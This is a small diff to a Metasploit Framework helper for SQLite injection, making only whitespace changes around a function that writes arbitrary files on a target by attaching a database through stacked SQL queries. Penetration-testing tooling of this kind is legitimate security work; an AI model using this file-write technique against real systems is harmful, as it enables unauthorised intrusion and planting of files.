+++ lib/msf/core/exploit/sqli/sqlitei/common.rb
@@ -49,9 +49,10 @@ module Msf::Exploit::SQLi::SQLitei
     # Note: target must support stacked queries
     #
     def write_to_file(fpath, data)
-      db, tbl, col = 3.times.map{ Rex::Text.rand_text_alpha(rand(2..5)) }
+      db, tbl, col = 3.times.map { Rex::Text.rand_text_alpha(rand(2..5)) }
       run_sql("attach database '#{fpath}' AS #{db}; create table #{db}.#{tbl}(#{col} blob); insert into #{db}.#{tbl}(#{col}) values('#{data}')")
     end
+
     #
     # Dumps data from a given table
     # @param table [String] The name of the table
